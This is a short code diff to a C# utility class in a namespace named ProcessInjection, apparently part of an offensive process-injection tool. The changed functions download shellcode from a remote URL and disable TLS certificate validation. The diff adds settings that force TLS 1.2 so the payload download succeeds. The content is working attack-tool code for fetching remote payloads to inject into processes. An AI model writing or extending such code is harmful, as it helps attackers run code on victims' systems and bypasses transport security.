@@ -44,6 +44,8 @@ namespace ProcessInjection.Utils
         public static byte[] GetRawShellcode(string url)
         {
             ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+            ServicePointManager.Expect100Continue = true;                
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
             
             WebClient client = new WebClient();
             client.Proxy = WebRequest.GetSystemWebProxy();
@@ -56,6 +58,8 @@ namespace ProcessInjection.Utils
         public static string GetShellcode(string url)
         {
             ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+            ServicePointManager.Expect100Continue = true;                
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
             
             WebClient client = new WebClient();
             client.Proxy = WebRequest.GetSystemWebProxy();
